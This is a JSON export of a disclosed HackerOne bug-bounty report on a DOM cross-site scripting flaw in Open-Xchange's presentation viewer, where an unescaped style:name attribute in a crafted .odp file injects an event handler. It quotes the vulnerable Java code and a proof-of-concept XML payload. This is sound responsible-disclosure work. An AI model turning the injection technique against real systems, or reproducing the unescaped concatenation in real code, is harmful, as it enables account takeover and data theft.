{"id":894919,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ5MTk=","url":"https://hackerone.com/reports/894919","title":"XSS on opening malicious OpenOffice presentation document","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-09T22:40:43.433Z","submitted_at":"2020-06-09T22:40:43.433Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skr0x1c0","url":"/skr0x1c0","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-27T09:47:44.177Z","bug_reporter_agreed_on_going_public_at":"2020-09-24T07:56:43.490Z","team_member_agreed_on_going_public_at":"2020-11-27T09:47:44.094Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Title\nOpening a malicious OpenOffice presentation document may lead to cross site scripting (XSS) attacks\n\n# Description\nWhen generating HTML content for drawings present in `odp` file, a `div` is generated by [Drawing.java](https://gitlab.open-xchange.com/documents/office/-/blob/develop/com.openexchange.office.htmldoc/src/com/openexchange/office/htmldoc/Drawing.java#L213). The attribute `target` of this `div` is directly constructed from the field `target` without any HTML escaping as shown below.\n\n``` java\npublic class Drawing extends NodeHolder { \n    ...\n    private static final String  START = \" class='drawing inline' contenteditable='false' style='width: 50px; height: 50px; border: none;'\u003e\";\n\n    ...\n    private String target;\n    ...\n\n    @Override\n    public boolean appendContent(StringBuilder document) throws Exception {\n        ...\n        String content = START;\n        if (presentation) {\n            content = \"\";\n            if (null != target) {\n                content += \" target='\" + target + \"'\";\n            }\n\n            content += \"contenteditable='false' class='drawing absolute'\u003e\";\n        }\n\n        document.append(content);\n        ...\n    }\n    ...\n\n    public Drawing setTarget(String target) {\n        this.target = target;\n        return this;\n    }\n}\n```\n\nFor an OpenDocument presentation file, the `target` field is constructed from attribute `style:name` of the element `style:master-page` (parent `master-page` element of drawing). This attribute may contain \"single quotes\" which can be used for injecting arbitary HTML code into the generated HTML. A `odp` document with `style.xml` file of following format will execute `alert(document.domain)` javascript code when user opens the document.\n\n``` xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003coffice:document-styles x...\u003e\n    ...\n    \u003coffice:master-styles\u003e\n        ...\n        \u003cstyle:master-page draw:style-name=\"dp1\"\n                           style:name=\"Default' style='animation-name: fa-spin' onanimationstart='alert(document.domain)\"\n                           style:page-layout-name=\"PM1\"\u003e\n            ...\n            \u003cdraw:frame svg:width=\"37.57mm\" draw:name=\"picture\" draw:style-name=\"g2046250599\" draw:id=\"2\"\n                        svg:y=\"78.32mm\" xml:id=\"2\" svg:height=\"53.45mm\" svg:x=\"121.18mm\"\u003e\n                \u003cdraw:image xlink:type=\"simple\" xlink:href=\"Pictures/uid542c76aa0ab9.png\"/\u003e\n            \u003c/draw:frame\u003e\n        \u003c/style:master-page\u003e\n    \u003c/office:master-styles\u003e\n\u003c/office:document-styles\u003e\n```\n\nThe generated HTML for the drawing of following format\n``` xml\n\u003cdiv contenteditable='false'\n     jquerydata='...' data-type='image' target='Default' style='animation-name: fa-spin'\n     onanimationstart='alert(document.domain)' contenteditable='false' class='drawing absolute'\u003e\n    \u003cdiv class='content'\u003e\n        \u003cimg __imagesource__='...' style='...'\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n```\n\n# Steps to reproduce\n1. Upload attached `payload_drawing.odp` to OX drive\n2. Open the `payload_drawing.odp` file. This will trigger an alert dialog with value `document.domain`\n\n## Impact\n\nThis XSS can execute arbitary javascript code without any user interaction when the user opens a maliciously crafted OpenOffice text document. This can be used for extracting and tampering user data (including encrypted documents) and executing other actions on user account like sending emails.","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861430,"file_name":"payload_drawing.odp","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RJf5QUiEVE6yY5yg69auBHtJ?response-content-disposition=attachment%3B%20filename%3D%22payload_drawing.odp%22%3B%20filename%2A%3DUTF-8%27%27payload_drawing.odp\u0026response-content-type=application%2Fvnd.oasis.opendocument.presentation\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153929Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ab309f5665cfd9142f37b934104af58245e2ca2c58bb9d573f91e2902626ce80","file_size":33295,"type":"application/vnd.oasis.opendocument.presentation"}],"allow_singular_disclosure_at":null,"vote_count":7,"voters":["vovohelo","ali","what_web","khizer47","alokbatham","j3mm4","a1r33s"],"severity":{"rating":"medium","score":4.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8269756,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-12T07:14:43.832Z","updated_at":"2020-06-12T07:14:43.832Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8269759,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-06-12T07:15:34.377Z","updated_at":"2020-06-12T07:15:34.377Z","additional_data":{"old_severity":"High (8.1)","new_severity":"Medium (4.6)","old_severity_id":745615,"new_severity_id":747609},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8269769,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report, we'll have a look!","automated_response":false,"created_at":"2020-06-12T07:16:59.094Z","updated_at":"2020-06-12T07:16:59.094Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8319649,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-06-17T12:28:02.365Z","updated_at":"2020-06-17T12:28:02.365Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skr0x1c0","url":"/skr0x1c0"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8319656,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-06-17T12:28:48.483Z","updated_at":"2020-06-17T12:28:48.483Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"400.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"skr0x1c0","url":"/skr0x1c0"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9315776,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since this bug is fixed in 7.10.4, can we disclose this report?","automated_response":false,"created_at":"2020-09-24T07:56:43.515Z","updated_at":"2020-09-24T07:56:43.515Z","first_to_agree":true,"actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9897185,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This bug was disclosed on security advisory published in 13th October 2020 (https://seclists.org/fulldisclosure/2020/Oct/20).\n\nCan we disclose this report also?","automated_response":false,"created_at":"2020-11-23T11:26:49.261Z","updated_at":"2020-11-23T11:26:49.261Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9939663,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @mheiland, is there any reason why this report was not disclosed along with others? If so, can you tell me when this report may be disclosed?","automated_response":false,"created_at":"2020-11-27T08:23:04.560Z","updated_at":"2020-11-27T08:23:04.560Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9941744,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-27T09:47:44.116Z","updated_at":"2020-11-27T09:47:44.116Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9941745,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-27T09:47:44.204Z","updated_at":"2020-11-27T09:47:44.204Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}